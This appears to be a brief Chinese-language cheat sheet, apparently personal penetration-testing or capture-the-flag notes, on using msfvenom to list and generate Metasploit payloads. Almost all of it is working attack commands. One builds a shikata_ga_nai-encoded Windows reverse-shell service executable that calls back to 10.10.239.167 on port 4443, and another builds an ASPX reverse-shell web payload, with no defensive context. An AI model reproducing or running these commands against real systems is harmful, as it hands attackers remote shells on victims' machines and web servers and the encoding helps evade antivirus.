

**列出payload**：  
```bash
msfvenom -l payloads
```
### 用法：  

```bash
msfvenom -p <payload> LHOST=<本地IP> LPORT=<监听端口> -f <文件类型> -o <文件名>
```

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.239.167 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f aspx -o  reverse-shell.aspx
```


